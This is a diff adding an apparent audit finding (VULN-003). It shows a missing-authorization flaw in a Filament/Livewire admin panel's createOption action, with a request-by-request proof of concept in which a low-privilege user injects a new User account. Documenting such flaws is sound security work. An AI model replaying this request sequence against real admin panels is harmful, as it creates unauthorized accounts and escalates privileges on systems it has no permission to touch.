@@ -1,0 +1,16 @@
+### VULN-003 — decisive requests. Full capture in response.txt / run.log.
+### The createOption action has NO ->authorize() and never checks the related model's
+### `create` policy — only isDisabled() + form-schema presence gate it.
+
+### 1) Snapshot — Post edit page (authed low-priv user). author Select has createOptionForm.
+GET /admin/posts/1/edit HTTP/1.1
+Host: localhost:21890
+
+### 2) Mount the createOption action
+POST /livewire/update  (calls: mountAction "createOption" {} {"recordKey":"1","schemaComponent":"form.author_id"})
+
+### 3) Submit the modal → a new User row is created (no create authorization)
+POST /livewire/update  (updates: {"mountedActions.0.data.name":"Injected ...",
+  "mountedActions.0.data.email":"injected_...@attacker.invalid",
+  "mountedActions.0.data.password":"InjectedPass-...!"}; calls: callMountedAction)
+### → newModelInstance()->fill($data)->save(): User::count() increases by 1
